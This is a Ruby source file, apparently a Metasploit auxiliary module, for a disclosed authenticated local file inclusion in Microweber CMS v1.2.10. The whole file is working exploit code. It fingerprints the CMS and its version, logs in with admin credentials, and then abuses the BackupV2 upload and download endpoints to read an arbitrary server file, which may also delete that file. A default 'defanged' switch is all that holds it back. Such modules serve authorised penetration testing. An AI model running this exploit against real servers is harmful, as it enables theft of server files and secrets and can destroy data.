##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microweber CMS v1.2.10 Local File Inclusion (Authenticated)',
        'Description' => %q{
          Microweber CMS v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
          Upload function may delete the local file if the web service user has access.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Talha Karakumru <talhakarakumru[at]gmail.com>'
        ],
        'References' => [
          ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
        ],
        'Notes' => {
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ OS_RESOURCE_LOSS ]
        },
        'Targets' => [
          [ 'Microweber v1.2.10', {} ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-01-30'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
        OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
        OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
        OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
        OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Microweber CMS cannot be reached.')
    end

    print_status 'Checking if it\'s Microweber CMS.'

    if res.code == 200 && !res.body.include?('Microweber')
      print_error 'Microweber CMS has not been detected.'
      Exploit::CheckCode::Safe
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    print_good 'Microweber CMS has been detected.'

    return check_version(res.body)
  end

  def check_version(res_body)
    print_status 'Checking Microweber\'s version.'

    begin
      major, minor, build = res_body[/Version:\s+(\d+\.\d+\.\d+)/].gsub(/Version:\s+/, '').split('.')
      version = Rex::Version.new("#{major}.#{minor}.#{build}")
    rescue NoMethodError, TypeError
      return Exploit::CheckCode::Safe
    end

    if version == Rex::Version.new('1.2.10')
      print_good 'Microweber version ' + version.to_s
      return Exploit::CheckCode::Appears
    end

    print_error 'Microweber version ' + version.to_s

    if version < Rex::Version.new('1.2.10')
      print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  def try_login
    print_status 'Trying to log in.'
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'lang' => '',
        'where_to' => 'admin_content'
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Log in request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    json_res = res.get_json_document

    if !json_res['error'].nil? && json_res['error'] == 'Wrong username or password.'
      fail_with(Failure::BadConfig, 'Wrong username or password.')
    end

    if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
      print_good 'You are logged in.'
      return
    end

    fail_with(Failure::Unknown, 'An unknown error occurred.')
  end

  def try_upload
    print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
      'vars_get' => {
        'src' => datastore['LOCAL_FILE_PATH']
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Upload request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['success']
        print_good json_res['success']
        return
      end

      fail_with(Failure::Unknown, res.body)
    end

    fail_with(Failure::BadConfig, 'Either the file cannot be read or the file does not exist.')
  end

  def try_download
    filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
    print_status 'Downloading ' + filename + ' from the backup folder.'

    referer = ''
    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
      referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
    else
      referer = full_uri
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
      'vars_get' => {
        'filename' => filename
      },
      'headers' => {
        'Referer' => referer
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Download request failed.')
    end

    if res.code != 200
      fail_with(Failure::Unknown, res.body)
    end

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['error']
        fail_with(Failure::Unknown, json_res['error'])
        return
      end
    end

    print_status res.body
  end

  def run
    if datastore['DEFANGED_MODE']
      warning = <<~EOF
        Triggering this vulnerability may delete the local file if the web service user has the permission.
        If you want to continue, disable the DEFANGED_MODE.
        => set DEFANGED_MODE false
      EOF

      fail_with(Failure::BadConfig, warning)
    end

    try_login
    try_upload
    try_download
  end
end
